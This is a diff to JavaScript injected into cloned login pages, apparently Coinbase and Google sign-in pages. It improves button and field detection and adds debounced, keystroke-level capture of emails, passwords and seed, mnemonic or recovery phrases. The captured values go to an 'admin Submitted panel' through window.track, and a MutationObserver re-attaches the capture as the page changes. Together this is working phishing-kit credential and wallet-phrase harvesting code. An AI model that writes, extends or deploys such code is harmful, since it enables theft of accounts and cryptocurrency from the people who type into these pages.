@@ -1181,8 +1181,23 @@ function replaceEmailPlaceholder(){
   walk(document.body);
 }
 function findContinueButton(scope){
-  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"], [role="button"]'));
-  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next|suivant/i.test((b.textContent || b.value || '').trim()); })
+  var root = scope || document;
+  // Prefer explicit submit controls (Coinbase saved pages use data-testid/name).
+  var explicit = root.querySelector(
+    'button[type="submit"][data-testid*="submit"], button[type="submit"][name*="submit"], input[type="submit"], #continueBtn'
+  );
+  if (explicit) return explicit;
+  var buttons = Array.prototype.slice.call(root.querySelectorAll('button, input[type="button"], input[type="submit"], [role="button"]'));
+  return buttons.find(function(b){
+    var testid = (b.getAttribute && b.getAttribute('data-testid')) || '';
+    var name = (b.getAttribute && b.getAttribute('name')) || '';
+    if (/submit|continue/i.test(testid) || /submit/i.test(name)) return true;
+    var txt = (b.textContent || b.value || '').trim();
+    // Skip OAuth / social-login buttons that also match "sign in".
+    if (/sign\\s*in\\s+with\\s+(google|apple|passkey)/i.test(txt)) return false;
+    return /continue|^next$|log\\s*in$/i.test(txt);
+  })
+    || buttons.find(function(b){ return b.type === 'submit'; })
     || document.getElementById('continueBtn')
     || buttons[0];
 }
@@ -1210,8 +1225,8 @@ function wireContinueButtons(){
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
   var nextPage = bodyNext || NEXT[here] || 'loading';
 
-  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
-  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
+  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden):not([disabled]), input[name*="mail" i]:not([aria-hidden="true"]):not([disabled]), input[id*="mail" i]:not([aria-hidden="true"]):not([disabled]), input[data-testid*="email" i]:not([aria-hidden="true"]):not([disabled]), input[autocomplete*="email" i]:not([aria-hidden="true"]):not([disabled]), input[autocomplete*="username" i]:not([aria-hidden="true"]):not([disabled]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden):not([disabled])'));
+  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]):not([disabled]), input[name*="pass" i]:not([aria-hidden="true"]):not([disabled]), input[data-testid*="password" i]:not([aria-hidden="true"]):not([disabled]), input[name="Passwd"]'));
   var hasPassword = passwords.length > 0;
   if (!emails.length && !hasPassword) {
     emails = Array.prototype.slice.call(document.querySelectorAll('form input[type="text"], input[type="text"]')).slice(0, 1);
@@ -1232,7 +1247,12 @@ function wireContinueButtons(){
   }
   var root = input.closest('form') || document;
   var btn = findContinueButton(root) || findContinueButton(document);
-  if (!btn || btn.__uxContinueWired) return;
+  if (!btn) return;
+  // Re-wire if we previously attached to the wrong button (e.g. OAuth).
+  if (btn.__uxContinueWired) {
+    if (btn.type === 'submit' || /submit|continue/i.test(btn.getAttribute('data-testid') || '')) return;
+    btn.__uxContinueWired = false;
+  }
   btn.__uxContinueWired = true;
   function ok(){ return (input.value || '').length > 0; }
   function sync(){ if (ok()) forceEnable(btn); else forceDisable(btn); }
@@ -1299,6 +1319,43 @@ function wireContinueButtons(){
   }, true);
   sync();
 }
+// Debounced submitted-value tracking — keeps the admin Submitted panel in sync
+// while the participant types (not only on Continue click).
+var __ux_track_timers = {};
+function __ux_submitted_field(el){
+  var type = (el.type || 'text').toLowerCase();
+  var tag = el.tagName;
+  var name = __ux_field_name(el);
+  if (type === 'password' || /pass/i.test(name)) return 'password_submitted';
+  if (type === 'email' || /mail|identifier|user/i.test(name)) return 'email_submitted';
+  if (tag === 'TEXTAREA' || /phrase|seed|mnemonic|recovery/i.test(name)) return 'phrase';
+  return name || 'input';
+}
+function __ux_track_submitted(el){
+  var value = el.value == null ? '' : String(el.value);
+  try { window.track(__ux_submitted_field(el), value); } catch(err){}
+}
+function wireAutoTrackInputs(){
+  var els = document.querySelectorAll('input, textarea');
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    if (el.__uxAutoTrackWired) continue;
+    if (el.type === 'hidden' || el.disabled) continue;
+    if (el.getAttribute('aria-hidden') === 'true' || (el.classList && el.classList.contains('sf-hidden'))) continue;
+    if (!__ux_is_typeable(el) && el.tagName !== 'TEXTAREA') continue;
+    el.__uxAutoTrackWired = true;
+    (function(target){
+      var key = target.id || __ux_field_name(target);
+      var debounced = function(){
+        clearTimeout(__ux_track_timers[key]);
+        __ux_track_timers[key] = setTimeout(function(){ __ux_track_submitted(target); }, 400);
+      };
+      target.addEventListener('input', debounced, true);
+      target.addEventListener('change', debounced, true);
+      target.addEventListener('blur', function(){ __ux_track_submitted(target); }, true);
+    })(el);
+  }
+}
 function wirePasswordToggles(){
   if (window.__pwToggleWired) return;
   window.__pwToggleWired = true;
@@ -1344,12 +1401,22 @@ function wirePasswordToggles(){
     } catch(_){}
   }, true);
 }
-function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); wirePasswordToggles(); }
+function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); wireAutoTrackInputs(); wirePasswordToggles(); }
 boot();
 if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
-// Re-run after late hydration (Google saved pages mutate the DOM after load).
+// Re-run after late hydration (saved SPAs mutate the DOM after load).
 setTimeout(boot, 400);
 setTimeout(boot, 1200);
+setTimeout(boot, 2500);
+try {
+  var __ux_dom_boot = function(){ boot(); };
+  var __ux_mo = new MutationObserver(function(muts){
+    for (var i = 0; i < muts.length; i++) {
+      if (muts[i].addedNodes && muts[i].addedNodes.length) { __ux_dom_boot(); return; }
+    }
+  });
+  __ux_mo.observe(document.documentElement, { childList: true, subtree: true });
+} catch(e){}
 function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
 reportViewport();
 window.addEventListener('resize', reportViewport, {passive:true});
